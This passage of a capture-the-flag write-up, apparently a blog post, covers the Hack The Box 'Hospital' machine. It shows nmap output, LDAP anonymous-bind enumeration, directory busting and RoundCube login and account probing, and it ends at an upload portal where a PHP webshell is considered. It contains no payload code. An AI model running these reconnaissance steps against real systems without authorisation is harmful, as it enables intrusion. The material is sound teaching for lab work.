+</span></span><span style="display:flex;"><span>  |_  <span style="color:#ae81ff">256</span> 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  53/tcp    open  domain            Simple DNS Plus
+</span></span><span style="display:flex;"><span>  88/tcp    open  kerberos-sec      Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-09-30 13:18:20Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  135/tcp   open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>  389/tcp   open  ldap              Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  | ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC
+</span></span><span style="display:flex;"><span>  | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+</span></span><span style="display:flex;"><span>  | Not valid before: 2023-09-06T10:49:03
+</span></span><span style="display:flex;"><span>  |_Not valid after:  2028-09-06T10:49:03
+</span></span><span style="display:flex;"><span>  443/tcp   open  ssl/http          Apache httpd 2.4.56 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1t PHP/8.0.28<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |_http-title: Hospital Webmail :: Welcome to Hospital Webmail
+</span></span><span style="display:flex;"><span>  |_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>  |_http-server-header: Apache/2.4.56 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span> OpenSSL/1.1.1t PHP/8.0.28
+</span></span><span style="display:flex;"><span>  | ssl-cert: Subject: commonName<span style="color:#f92672">=</span>localhost
+</span></span><span style="display:flex;"><span>  | Not valid before: 2009-11-10T23:48:47
+</span></span><span style="display:flex;"><span>  |_Not valid after:  2019-11-08T23:48:47
+</span></span><span style="display:flex;"><span>  | tls-alpn:
+</span></span><span style="display:flex;"><span>  |_  http/1.1
+</span></span><span style="display:flex;"><span>  445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>  464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>  593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>  636/tcp   open  ldapssl?
+</span></span><span style="display:flex;"><span>  | ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC
+</span></span><span style="display:flex;"><span>  | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+</span></span><span style="display:flex;"><span>  | Not valid before: 2023-09-06T10:49:03
+</span></span><span style="display:flex;"><span>  |_Not valid after:  2028-09-06T10:49:03
+</span></span><span style="display:flex;"><span>  1801/tcp  open  msmq?
+</span></span><span style="display:flex;"><span>  2103/tcp  open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  2105/tcp  open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  2107/tcp  open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  2179/tcp  open  vmrdp?
+</span></span><span style="display:flex;"><span>  3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  | ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC
+</span></span><span style="display:flex;"><span>  | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+</span></span><span style="display:flex;"><span>  | Not valid before: 2023-09-06T10:49:03
+</span></span><span style="display:flex;"><span>  |_Not valid after:  2028-09-06T10:49:03
+</span></span><span style="display:flex;"><span>  3269/tcp  open  globalcatLDAPssl?
+</span></span><span style="display:flex;"><span>  | ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC
+</span></span><span style="display:flex;"><span>  | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+</span></span><span style="display:flex;"><span>  | Not valid before: 2023-09-06T10:49:03
+</span></span><span style="display:flex;"><span>  |_Not valid after:  2028-09-06T10:49:03
+</span></span><span style="display:flex;"><span>  3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
+</span></span><span style="display:flex;"><span>  | rdp-ntlm-info:
+</span></span><span style="display:flex;"><span>  |   Target_Name: HOSPITAL
+</span></span><span style="display:flex;"><span>  |   NetBIOS_Domain_Name: HOSPITAL
+</span></span><span style="display:flex;"><span>  |   NetBIOS_Computer_Name: DC
+</span></span><span style="display:flex;"><span>  |   DNS_Domain_Name: hospital.htb
+</span></span><span style="display:flex;"><span>  |   DNS_Computer_Name: DC.hospital.htb
+</span></span><span style="display:flex;"><span>  |   DNS_Tree_Name: hospital.htb
+</span></span><span style="display:flex;"><span>  |   Product_Version: 10.0.17763
+</span></span><span style="display:flex;"><span>  |_  System_Time: 2024-09-30T13:19:21+00:00
+</span></span><span style="display:flex;"><span>  | ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC.hospital.htb
+</span></span><span style="display:flex;"><span>  | Not valid before: 2024-09-29T13:09:46
+</span></span><span style="display:flex;"><span>  |_Not valid after:  2025-03-31T13:09:46
+</span></span><span style="display:flex;"><span>  5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  |_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>  |_http-title: Not Found
+</span></span><span style="display:flex;"><span>  6404/tcp  open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  6406/tcp  open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  6407/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>  6409/tcp  open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  6615/tcp  open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  6633/tcp  open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  8080/tcp  open  http              Apache httpd 2.4.55 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>  |_http-open-proxy: Proxy might be redirecting requests
+</span></span><span style="display:flex;"><span>  | http-title: Login
+</span></span><span style="display:flex;"><span>  |_Requested resource was login.php
+</span></span><span style="display:flex;"><span>  | http-cookie-flags:
+</span></span><span style="display:flex;"><span>  |   /:
+</span></span><span style="display:flex;"><span>  |     PHPSESSID:
+</span></span><span style="display:flex;"><span>  |_      httponly flag not set
+</span></span><span style="display:flex;"><span>  |_http-server-header: Apache/2.4.55 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  9389/tcp  open  mc-nmf            .NET Message Framing
+</span></span><span style="display:flex;"><span>  26327/tcp open  msrpc             Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>  Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>  Device type: general purpose
+</span></span><span style="display:flex;"><span>  Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Linux 5.X <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  OS CPE: cpe:/o:linux:linux_kernel:5.0
+</span></span><span style="display:flex;"><span>  Aggressive OS guesses: Linux 5.0 <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Host script results:
+</span></span><span style="display:flex;"><span>  |_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
+</span></span><span style="display:flex;"><span>  | smb2-security-mode:
+</span></span><span style="display:flex;"><span>  |   3:1:1:
+</span></span><span style="display:flex;"><span>  |_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>  | smb2-time:
+</span></span><span style="display:flex;"><span>  |   date: 2024-09-30T13:19:21
+</span></span><span style="display:flex;"><span>  |_  start_date: N/A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>  Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 292.59 seconds</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>We can confirm we are working with a domain controller as the DNS name is <code>DC.hospital.htb</code></li>
+<li>SMB signing is required.</li>
+</ul>
+</li>
+</ul>
+<h3 id="ldap-389">LDAP <code>389</code>:</h3>
+<ul>
+<li>
+<p><strong>Using LDAP anonymous bind to enumerate further</strong>:</p>
+<ul>
+<li>If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
+<ul>
+<li>We can actually retrieve a significant amount of information via anonymous bind such as:
+<ul>
+<li>A list of all users</li>
+<li>A list of all groups</li>
+<li>A list of all computers.</li>
+<li>User account attributes.</li>
+<li>The domain password policy.</li>
+<li>Enumerate users who are susceptible to AS-REPRoasting.</li>
+<li>Passwords stored in the description fields</li>
+</ul>
+</li>
+<li>The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here</p>
+<ul>
+<li><a href="https://github.com/bloodstiller/ldapchecker">https://github.com/bloodstiller/ldapchecker</a></li>
+</ul>
+</li>
+<li>
+<p>It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.</p>
+<ol>
+<li>
+<p><!-- raw HTML omitted -->We have the naming context of the domain<!-- raw HTML omitted -->:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20~/Desktop/WindowsTools%20%ef%90%8d%20v3.12.6%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%ef%95%99%2007:16:00%20zsh%20%e2%9d%af%20python3%20ldapchecker.py%20$box%0aAttempting%20to%20connect%20to%2010.129.229.189%20with%20SSL...%0aConnected%20successfully.%20Retrieving%20server%20information...%0aDSA%20info%20%28from%20DSE%29:%0a%20%20Supported%20LDAP%20versions:%203,%202%0a%20%20Naming%20contexts:%0a%20%20%20%20DC=hospital,DC=htb%0a%20%20%20%20CN=Configuration,DC=hospital,DC=htb%0a%20%20%20%20CN=Schema,CN=Configuration,DC=hospital,DC=htb%0a%20%20%20%20DC=DomainDnsZones,DC=hospital,DC=htb%0a%20%20%20%20DC=ForestDnsZones,DC=hospital,DC=htb%0a%20%20Supported%20controls:">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in ~/Desktop/WindowsTools  v3.12.6  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span> 07:16:00 zsh ❯ python3 ldapchecker.py $box
+</span></span><span style="display:flex;"><span>Attempting to connect to 10.129.229.189 with SSL...
+</span></span><span style="display:flex;"><span>Connected successfully. Retrieving server information...
+</span></span><span style="display:flex;"><span>DSA info <span style="color:#f92672">(</span>from DSE<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>  Supported LDAP versions: 3, <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>  Naming contexts:
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>hospital,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>hospital,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>hospital,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>hospital,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>hospital,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>  Supported controls:</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><!-- raw HTML omitted -->We have the domain functionaility level<!-- raw HTML omitted -->:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Other:
+</span></span><span style="display:flex;"><span>  domainFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  forestFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  domainControllerFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  rootDomainNamingContext:
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>hospital,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>  ldapServiceName:
+</span></span><span style="display:flex;"><span>    hospital.htb:dc$@HOSPITAL.HTB</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>The functionality level determines the minimum version of Windows server that can be used for a DC.
+<ul>
+<li>
+<p>Note that any host os can used on <strong>workstations</strong>, however the functionality level determines what the minimum version for DC&rsquo;s and the forest.</p>
+</li>
+<li>
+<p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels</a></p>
+</li>
+<li>
+<p>Knowing the function level is useful as if want to target the DC&rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.</p>
+</li>
+<li>
+<p>In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.</p>
+</li>
+<li>
+<p>Here’s a list of functional level numbers and their corresponding Windows Server operating systems:</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Functional Level Number</th>
+          <th style="text-align: left">Corresponding OS</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">0</td>
+          <td style="text-align: left">Windows 2000</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">1</td>
+          <td style="text-align: left">Windows Server 2003 Interim</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">2</td>
+          <td style="text-align: left">Windows Server 2003</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">3</td>
+          <td style="text-align: left">Windows Server 2008</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">4</td>
+          <td style="text-align: left">Windows Server 2008 R2</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">5</td>
+          <td style="text-align: left">Windows Server 2012</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">6</td>
+          <td style="text-align: left">Windows Server 2012 R2</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">7</td>
+          <td style="text-align: left">Windows Server 2016</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">8</td>
+          <td style="text-align: left">Windows Server 2019</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">9</td>
+          <td style="text-align: left">Windows Server 2022</td>
+      </tr>
+  </tbody>
+</table>
+<ul>
+<li>Note:
+<ul>
+<li>Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.</li>
+<li>As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><!-- raw HTML omitted -->We have the full server name<!-- raw HTML omitted -->:</p>
+<ul>
+<li>Again we can see this has the CN as the base (mentioned previously.) So it appears it&rsquo;s a printer server site of some sort. What is also interesting is the CN name &ldquo;Configuration&rdquo;, this could imply that it is still to be configured. Which is interesting as things that are still being configured may not have had thorough security standards actioned.
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>serverName:
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>DC,CN<span style="color:#f92672">=</span>Servers,CN<span style="color:#f92672">=</span>Default-First-Site-Name,CN<span style="color:#f92672">=</span>Sites,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>hospital,DC<span style="color:#f92672">=</span>htb</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>
+<p>It&rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.</p>
+<ul>
+<li>We have the naming context.</li>
+<li>Domain name.</li>
+</ul>
+</li>
+</ul>
+<h3 id="smb-445">SMB <code>445</code>:</h3>
+<ul>
+<li><strong>I try guest &amp; null sessions to enumerate SMB they have been disabled</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-073343_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="dns-53">DNS <code>53</code>:</h3>
+<ul>
+<li><strong>I run dnsenum, to enumerate any interesting records</strong>:
+<ul>
+<li>I get duplicate entries, but looking at my hosts file there is no listing for these so unsure what is going on here…..
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-082524_.png">
+</figure>
+</li>
+<li>Nothing of note</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="ssh-22">SSH <code>22</code>:</h3>
+<h3 id="https-443">HTTPS <code>443</code>:</h3>
+<h4 id="web-mail-service-discovery">Web Mail Service Discovery:</h4>
+<ul>
+<li><strong>There is a hospital webmail application running here</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-073947_.png">
+</figure>
+</li>
+<li><strong>Looking at Wappalyzer</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-074030_.png">
+</figure>
+
+<ul>
+<li>We can see the webmail is running on a service called &ldquo;<code>RoundCube</code>&rdquo;</li>
+</ul>
+</li>
+<li><figure><img src="/ox-hugo/2024-09-30-074124_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li><strong>I do a quick search for RoundCube CVE&rsquo;s</strong>:
+<ul>
+<li><a href="https://www.cvedetails.com/vulnerability-list/vendor_id-8905/Roundcube.html">https://www.cvedetails.com/vulnerability-list/vendor_id-8905/Roundcube.html</a></li>
+<li>I find this RoundCube command injection vulnerability:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-074300_.png">
+</figure>
+</li>
+<li>We will keep hold of this but continue to enumerate</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="enumerating-the-tech-stack-of-the-web-mail-server">Enumerating the Tech Stack of the Web-Mail Server:</h4>
+<ul>
+<li><strong>Enumerate the Tech Stack</strong>:
+<ul>
+<li><code>whatweb https://$box</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-093241_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="directory-busting-https-using-feroxbuster">Directory Busting HTTPS Using Feroxbuster:</h4>
+<ul>
+<li><code>feroxbuster -u https://10.129.229.189 -k</code>
+<ul>
+<li><strong>Note</strong>: If the domain uses self-signed certs we have to pass the <code>-k</code> flag as otherwise ferox will not run as it rejects self-signed certs.
+<ul>
+<li>
+<figure><img src="/ox-hugo/2024-09-30-081433_.png">
+</figure>
+
+<ul>
+<li>We can see that there is a <code>phpmyadmin</code> page running, which is a good target, however it&rsquo;s a 403 so we cannot get access to directly. However we may be able to gain access via the web-proxy that is running?</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="https://10.129.229.189/skins/elastic/watermark.html%0ahttps://10.129.229.189/skins/elastic/images/logo.svg%0ahttps://10.129.229.189/program/js/common.min.js%0ahttps://10.129.229.189/skins/elastic/ui.min.js%0ahttps://10.129.229.189/program/js/jstz.min.js%0ahttps://10.129.229.189/skins/elastic/images/favicon.ico%0ahttps://10.129.229.189/plugins/jqueryui/themes/elastic/jquery-ui.min.css%0ahttps://10.129.229.189/phpmyadmin%0ahttps://10.129.229.189/skins/elastic/styles/styles.min.css%0ahttps://10.129.229.189/skins/elastic/deps/bootstrap.bundle.min.js%0ahttps://10.129.229.189/program/js/jquery.min.js%0ahttps://10.129.229.189/program/js/app.min.js%0ahttps://10.129.229.189/skins/elastic/deps/bootstrap.min.css%0ahttps://10.129.229.189/plugins/jqueryui/js/jquery-ui.min.js%0ahttps://10.129.229.189/%0ahttps://10.129.229.189/installer%20=%3e%20https://10.129.229.189/installer/%0ahttps://10.129.229.189/examples%0ahttps://10.129.229.189/installer/images%20=%3e%20https://10.129.229.189/installer/imag">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>https://10.129.229.189/skins/elastic/watermark.html
+</span></span><span style="display:flex;"><span>https://10.129.229.189/skins/elastic/images/logo.svg
+</span></span><span style="display:flex;"><span>https://10.129.229.189/program/js/common.min.js
+</span></span><span style="display:flex;"><span>https://10.129.229.189/skins/elastic/ui.min.js
+</span></span><span style="display:flex;"><span>https://10.129.229.189/program/js/jstz.min.js
+</span></span><span style="display:flex;"><span>https://10.129.229.189/skins/elastic/images/favicon.ico
+</span></span><span style="display:flex;"><span>https://10.129.229.189/plugins/jqueryui/themes/elastic/jquery-ui.min.css
+</span></span><span style="display:flex;"><span>https://10.129.229.189/phpmyadmin
+</span></span><span style="display:flex;"><span>https://10.129.229.189/skins/elastic/styles/styles.min.css
+</span></span><span style="display:flex;"><span>https://10.129.229.189/skins/elastic/deps/bootstrap.bundle.min.js
+</span></span><span style="display:flex;"><span>https://10.129.229.189/program/js/jquery.min.js
+</span></span><span style="display:flex;"><span>https://10.129.229.189/program/js/app.min.js
+</span></span><span style="display:flex;"><span>https://10.129.229.189/skins/elastic/deps/bootstrap.min.css
+</span></span><span style="display:flex;"><span>https://10.129.229.189/plugins/jqueryui/js/jquery-ui.min.js
+</span></span><span style="display:flex;"><span>https://10.129.229.189/
+</span></span><span style="display:flex;"><span>https://10.129.229.189/installer <span style="color:#f92672">=</span>&gt; https://10.129.229.189/installer/
+</span></span><span style="display:flex;"><span>https://10.129.229.189/examples
+</span></span><span style="display:flex;"><span>https://10.129.229.189/installer/images <span style="color:#f92672">=</span>&gt; https://10.129.229.189/installer/imag</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="attempting-to-login">Attempting to Login:</h4>
+<ul>
+<li>I attempt to login and look at the request in burp:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-080704_.png">
+</figure>
+
+<ul>
+<li>I am getting an unauthorized response, I cannot see why, potentially a red-herring?</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="http-proxy-8080">HTTP-PROXY <code>8080</code>:</h3>
+<h4 id="enumerating-the-tech-stack-of-the-proxy-server">Enumerating the Tech Stack of the proxy server:</h4>
+<ul>
+<li><strong>Looking at whatweb this host appears to be running on Ubunutu</strong>:
+<ul>
+<li><code>whatweb http://$box:8080</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-093136_.png">
+</figure>
+
+<ul>
+<li>This is interesting as it would seem this is running in a VM, which makes sense as there is a hyper V instance (I think), running as port <code>2179 vmrdp</code> is running.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="directory-busting-web-proxy-using-feroxbuster">Directory Busting Web Proxy Using Feroxbuster:</h4>
+<ul>
+<li>All of these pages are not directly accessible:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-081611_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="http://10.129.229.189:8080/%0ahttp://10.129.229.189:8080/images/%0ahttp://10.129.229.189:8080/css/%0ahttp://10.129.229.189:8080/uploads/%0ahttp://10.129.229.189:8080/fonts/%0ahttp://10.129.229.189:8080/js/%0ahttp://10.129.229.189:8080/vendor/%0ahttp://10.129.229.189:8080/vendor/jquery/%0ahttp://10.129.229.189:8080/images/icons/%0ahttp://10.129.229.189:8080/vendor/animate/">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>http://10.129.229.189:8080/
+</span></span><span style="display:flex;"><span>http://10.129.229.189:8080/images/
+</span></span><span style="display:flex;"><span>http://10.129.229.189:8080/css/
+</span></span><span style="display:flex;"><span>http://10.129.229.189:8080/uploads/
+</span></span><span style="display:flex;"><span>http://10.129.229.189:8080/fonts/
+</span></span><span style="display:flex;"><span>http://10.129.229.189:8080/js/
+</span></span><span style="display:flex;"><span>http://10.129.229.189:8080/vendor/
+</span></span><span style="display:flex;"><span>http://10.129.229.189:8080/vendor/jquery/
+</span></span><span style="display:flex;"><span>http://10.129.229.189:8080/images/icons/
+</span></span><span style="display:flex;"><span>http://10.129.229.189:8080/vendor/animate/</span></span></code></pre></div>
+    
+</div>
+<h4 id="web-mail-service-discovery-on-8080">Web Mail Service Discovery on 8080:</h4>
+<ul>
+<li><strong>Webmail login page</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-082031_.png">
+</figure>
+
+<ul>
+<li>I try and enter basic creds of <code>admin:admin</code> however these do not work:</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Looking at Wappalyzer</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-082119_.png">
+</figure>
+
+<ul>
+<li>We can see the webmail is running also on a service called &ldquo;<code>RoundCube</code>&rdquo;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="creating-an-account">Creating an account:</h4>
+<ul>
+<li>
+<p><strong>I can see that there is the option to create an account</strong>:</p>
+<ul>
+<li>
+<figure><img src="/ox-hugo/2024-09-30-081758_.png">
+</figure>
+
+</li>
+<li>
+<p>I try <code>admin:admin123</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-081932_.png">
+</figure>
+</li>
+<li>This lets me know that there is an <code>admin</code> user.</li>
+</ul>
+</li>
+<li>
+<p><strong>I check for default credentials for</strong> <code>RoundCube</code> <strong>and find this post on their support forums</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-082800_.png">
+</figure>
+</li>
+<li>This lets me know that there is no default admin user, so the one that is on here is intentionally set.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I make an account</strong>:</p>
+<ul>
+<li><code>bloodstiller:bl00dst1113r</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="discovering-an-upload-portal">Discovering An Upload Portal:</h4>
+<ul>
+<li>
+<p><strong>After logging in I am given access to an upload portal</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-083122_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I test to see what sort of file types it is expecting</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-083525_.png">
+</figure>
+
+<ul>
+<li>I can see it&rsquo;s expecting image types however it is running on <code>.php</code> which means we can potentially upload a php webshell.
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-085736_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I Upload a valid picture to see what happens</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-30-090121_.png">
+</figure>
+</li>
+<li>I then try and access it via the <code>uploads</code> directory which we found earlier when dirbusting:
+<ul>
